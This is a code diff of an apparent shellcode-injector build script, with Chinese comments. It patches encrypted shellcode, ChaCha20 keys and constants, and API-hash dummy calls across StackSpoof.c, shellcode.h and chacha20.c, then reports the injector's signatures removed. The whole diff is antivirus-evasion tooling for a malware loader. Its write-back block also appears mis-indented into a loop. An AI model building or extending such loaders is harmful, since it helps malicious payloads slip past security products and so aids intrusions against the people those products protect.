@@ -138,66 +138,71 @@ const2 = f'0x{CUSTOM_CONSTANTS[2]:08X}'
 const3 = f'0x{CUSTOM_CONSTANTS[3]:08X}'
 
 # C 文件路径
-c_file_path = '../SFCorePoc.c'
-
+c_file_path = '../StackSpoof.c'
+shellcode_path = '../shellcode.h'
+chacha20_path = '../chacha20.c'
 # 读取 C 文件内容（UTF-8 编码）
 with open(c_file_path, 'r', encoding='utf-8') as f:
     c_content = f.read()
 
+with open(shellcode_path, 'r', encoding='utf-8') as f:
+    shellcode_content = f.read()
+
+with open(chacha20_path, 'r', encoding='utf-8') as f:
+    chacha20_content = f.read()
+
 # 使用正则替换 encrypted_shellcode 数组
-c_content = re.sub(
+shellcode_content = re.sub(
     r'unsigned char encrypted_shellcode\[\] = \{[^}]*\};',
     f'unsigned char encrypted_shellcode[] = {{ {encrypted_array} }};',
-    c_content
+    shellcode_content
 )
 
 # 使用正则替换 key 数组
-c_content = re.sub(
+shellcode_content = re.sub(
     r'unsigned char key\[\] = \{[^}]*\};',
     f'unsigned char key[] = {{ {key_array} }};',
-    c_content
+    shellcode_content
 )
 
 # 使用正则替换 nonce 数组
-c_content = re.sub(
+shellcode_content = re.sub(
     r'unsigned char nonce\[\] = \{[^}]*\};',
     f'unsigned char nonce[] = {{ {nonce_array} }};',
-    c_content
+    shellcode_content
 )
 
 # 使用正则替换 state[0]
-c_content = re.sub(
+chacha20_content = re.sub(
     r'state\[0\] = 0x[0-9A-F]+;',
     f'state[0] = {const0};',
-    c_content
+    chacha20_content
 )
 
 # 使用正则替换 state[1]
-c_content = re.sub(
+chacha20_content = re.sub(
     r'state\[1\] = 0x[0-9A-F]+;',
     f'state[1] = {const1};',
-    c_content
+    chacha20_content
 )
 
 # 使用正则替换 state[2]
-c_content = re.sub(
+chacha20_content = re.sub(
     r'state\[2\] = 0x[0-9A-F]+;',
     f'state[2] = {const2};',
-    c_content
+    chacha20_content
 )
 
 # 使用正则替换 state[3]
-c_content = re.sub(
+chacha20_content = re.sub(
     r'state\[3\] = 0x[0-9A-F]+;',
     f'state[3] = {const3};',
-    c_content
+    chacha20_content
 )
 
 # 定义替换内容
 contents = [
-    '\tParams.DummyHash = 0x022B80BFE;\n\t*NullPointer = 1;\n\tGetFileAttributesW(L"D:\\\\logs\\\\sf.log");',
     '\tParams.DummyHash = 0x0A6208368;\n\t*NullPointer = 1;\n\tDWORD buf[3] = { 0 };\n\tGetDiskFreeSpaceW(L"C:\\\\", &buf[0], &buf[1], &buf[2], &buf[3]);',
-    '\tParams.DummyHash = 0x0A6208368;\n\t*NullPointer = 1;\n\tDWORD buf[4] = { 0 };\n\tGetVolumeInformationW(L"C:\\\\", &buf[0], sizeof(DWORD), &buf[1], &buf[2], &buf[3], &buf[4], sizeof(DWORD));',
     '\tParams.DummyHash = 0x09E349EA7;\n\t*NullPointer = 1;\n\tULONGLONG buf = 0;\n\tGetNumaNodeProcessorMask(0, &buf);',
     '\tParams.DummyHash = 0x09E349EA7;\n\t*NullPointer = 1;\n\tULONGLONG buf = 0;\n\tGetNumaAvailableMemoryNode(0, &buf);'
 ]
@@ -213,8 +218,12 @@ for i in range(1, 9):
     c_content = re.sub(pattern, repl, c_content, flags=re.DOTALL)
 
 # 写回 C 文件（UTF-8 编码）
-with open(c_file_path, 'w', encoding='utf-8') as f:
-    f.write(c_content)
+    with open(c_file_path, 'w', encoding='utf-8') as f:
+        f.write(c_content)
+    with open(shellcode_path, 'w', encoding='utf-8') as f:
+        f.write(shellcode_content)
+    with open(chacha20_path, 'w', encoding='utf-8') as f:
+        f.write(chacha20_content)
 
 # 打印确认信息
 print("注入器去特征完成")
